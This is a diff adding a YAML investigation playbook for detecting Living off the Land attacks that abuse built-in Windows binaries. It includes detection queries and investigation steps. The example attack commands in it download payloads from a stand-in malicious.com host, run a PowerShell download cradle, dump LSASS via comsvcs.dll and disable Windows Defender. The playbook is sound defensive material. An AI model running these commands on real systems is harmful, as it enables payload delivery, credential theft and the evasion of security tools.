@@ -1,0 +1,165 @@
+name: living_off_the_land
+display_name: Living off the Land Detection
+description: Investigation strategies for detecting Living off the Land (LOLBin) attacks - abuse of legitimate Windows binaries for malicious purposes
+
+playbook: |
+  ## LIVING OFF THE LAND (LOLBin) INVESTIGATION PLAYBOOK
+  
+  ### What is Living off the Land?
+  Attackers abusing legitimate, trusted Windows binaries to execute malicious actions while evading detection.
+  
+  ### Key LOLBins to Investigate:
+  
+  1. **certutil.exe - File Download & Encoding**
+     - Legitimate use: Certificate management
+     - Malicious use: Download payloads, encode/decode files
+     - Commands:
+       - `certutil.exe -urlcache -f http://malicious.com/payload.exe C:\Temp\payload.exe`
+       - `certutil.exe -decode encoded.txt decoded.exe`
+       - `certutil.exe -encode payload.exe encoded.txt`
+     - Query: `search_events_by_content` for 'certutil' with '-urlcache', '-decode', '-encode'
+     - Red flags: certutil with network activity, encoding suspicious files
+  
+  2. **bitsadmin.exe - Background File Transfer**
+     - Legitimate use: Background Intelligent Transfer Service
+     - Malicious use: Download malware, exfiltrate data
+     - Commands:
+       - `bitsadmin.exe /transfer job /download /priority high http://malicious.com/file.exe C:\Temp\file.exe`
+       - `bitsadmin.exe /create job1 & bitsadmin /addfile job1 http://... C:\...`
+     - Query: `search_events_by_content` for 'bitsadmin' with '/transfer', '/download'
+     - Red flags: BITS jobs to suspicious URLs, unusual download locations
+  
+  3. **mshta.exe - HTML Application Execution**
+     - Legitimate use: Execute .hta files
+     - Malicious use: Execute remote scripts, bypass AppLocker
+     - Commands:
+       - `mshta.exe http://malicious.com/payload.hta`
+       - `mshta.exe vbscript:Execute("malicious code")`
+     - Query: `search_events_by_content` for 'mshta' with 'http', 'vbscript:', 'javascript:'
+     - Red flags: mshta with URLs, inline scripts
+  
+  4. **rundll32.exe - DLL Execution**
+     - Legitimate use: Run DLL functions
+     - Malicious use: Execute malicious DLLs, proxy execution
+     - Commands:
+       - `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()`
+       - `rundll32.exe C:\malicious.dll,EntryPoint`
+       - `rundll32.exe comsvcs.dll,MiniDump <lsass_pid> dump.bin full`
+     - Query: `search_events_by_content` for 'rundll32' with 'javascript:', 'comsvcs.dll'
+     - Red flags: rundll32 with unusual DLLs, JavaScript execution, LSASS dumping
+  
+  5. **regsvr32.exe - DLL Registration**
+     - Legitimate use: Register COM DLLs
+     - Malicious use: Execute remote scripts, bypass AppLocker
+     - Commands:
+       - `regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll`
+       - `regsvr32.exe /s /n /u /i:file.sct scrobj.dll`
+     - Query: `search_events_by_content` for 'regsvr32' with '/i:', 'scrobj.dll'
+     - Red flags: regsvr32 with remote URLs, scriptlet files (.sct)
+  
+  6. **PowerShell.exe - Script Execution**
+     - Legitimate use: System administration
+     - Malicious use: Download payloads, execute scripts, credential theft
+     - Commands:
+       - `powershell.exe -EncodedCommand <base64>`
+       - `powershell.exe -ExecutionPolicy Bypass -File malicious.ps1`
+       - `powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://...')`
+       - `powershell.exe -WindowStyle Hidden -NoProfile -Command "..."`
+     - Query: `search_events_by_content` for 'powershell' with '-enc', '-e', 'IEX', 'DownloadString', 'Bypass'
+     - Red flags: Encoded commands, execution policy bypass, hidden windows, download cradles
+  
+  7. **wmic.exe - WMI Command-line**
+     - Legitimate use: System management
+     - Malicious use: Remote execution, persistence, reconnaissance
+     - Commands:
+       - `wmic process call create "cmd.exe /c malicious.exe"`
+       - `wmic /node:remote process call create "payload.exe"`
+       - `wmic os get /format:"http://malicious.com/payload.xsl"`
+     - Query: `search_events_by_content` for 'wmic' with 'process call create', '/format:', '/node:'
+     - Red flags: Remote execution, XSL script execution, suspicious processes
+  
+  8. **sc.exe - Service Control**
+     - Legitimate use: Service management
+     - Malicious use: Create malicious services, disable security tools
+     - Commands:
+       - `sc.exe create malservice binPath= "C:\malicious.exe" start= auto`
+       - `sc.exe stop WinDefend`
+       - `sc.exe config WinDefend start= disabled`
+     - Query: `search_events_by_content` for 'sc' with 'create', 'stop', 'config'
+     - Red flags: Service creation with suspicious paths, disabling security services
+  
+  9. **schtasks.exe - Task Scheduler**
+     - Legitimate use: Task scheduling
+     - Malicious use: Persistence, scheduled execution
+     - Commands:
+       - `schtasks.exe /create /tn "UpdateTask" /tr "C:\malicious.exe" /sc daily`
+       - `schtasks.exe /create /tn task /tr powershell.exe /sc onlogon`
+     - Query: `search_events_by_content` for 'schtasks' with '/create'
+     - Red flags: Tasks with suspicious executables, unusual schedules
+  
+  10. **msiexec.exe - Windows Installer**
+     - Legitimate use: Install MSI packages
+     - Malicious use: Install malware, remote execution
+     - Commands:
+       - `msiexec.exe /quiet /i http://malicious.com/payload.msi`
+       - `msiexec.exe /y malicious.dll`
+     - Query: `search_events_by_content` for 'msiexec' with '/i http', '/quiet'
+     - Red flags: Remote MSI installation, DLL execution
+  
+  ### Investigation Strategy:
+  
+  **Phase 1 - Identify LOLBin Usage**
+  - Query for common LOLBins: certutil, bitsadmin, mshta, rundll32, regsvr32
+  - Check CommandLine field for suspicious parameters
+  - Look for network activity (Sysmon 3) from LOLBins
+  
+  **Phase 2 - Analyze Context**
+  - What is the parent process? (Legitimate vs suspicious)
+  - What user executed it? (System, admin, regular user)
+  - What is the timeline? (After initial compromise?)
+  - What was the outcome? (File created, network connection)
+  
+  **Phase 3 - Correlate Activity**
+  - Check for file creation (Sysmon 11) after LOLBin execution
+  - Look for network connections (Sysmon 3) to external IPs
+  - Identify downloaded payloads or executed scripts
+  
+  **Phase 4 - Determine Impact**
+  - What was downloaded/executed?
+  - Was it successful?
+  - What happened next? (Persistence, lateral movement)
+  
+  ### Common LOLBin Patterns:
+  
+  - **Download Chain**: certutil/bitsadmin → Download payload → rundll32/regsvr32 execute
+  - **Fileless Execution**: PowerShell download cradle → In-memory execution
+  - **Proxy Execution**: mshta/regsvr32 → Execute remote script → Establish persistence
+  - **Credential Theft**: rundll32 comsvcs.dll → Dump LSASS → Exfiltrate
+  
+  ### Detection Queries:
+  
+  ```
+  # Find all certutil downloads
+  search_events_by_content(value='certutil', description='certutil usage')
+  query_jsonb_field(jsonb_path='EventData.CommandLine', operator='ILIKE', value='%certutil%urlcache%')
+  
+  # Find PowerShell download cradles
+  search_events_by_content(value='DownloadString', description='PowerShell download cradles')
+  search_events_by_content(value='IEX(New-Object', description='PowerShell IEX execution')
+  
+  # Find mshta with URLs
+  query_jsonb_field(jsonb_path='EventData.CommandLine', operator='ILIKE', value='%mshta%http%')
+  
+  # Find rundll32 with JavaScript
+  query_jsonb_field(jsonb_path='EventData.CommandLine', operator='ILIKE', value='%rundll32%javascript%')
+  ```
+  
+  ### Key Questions to Answer:
+  
+  1. Which LOLBins were used?
+  2. What were they used for? (Download, execute, encode)
+  3. What is the parent process? (Suspicious origin?)
+  4. Were files downloaded? (Check Sysmon 11)
+  5. Were network connections made? (Check Sysmon 3)
+  6. What was executed after LOLBin usage?
+  7. Is this part of a larger attack chain?
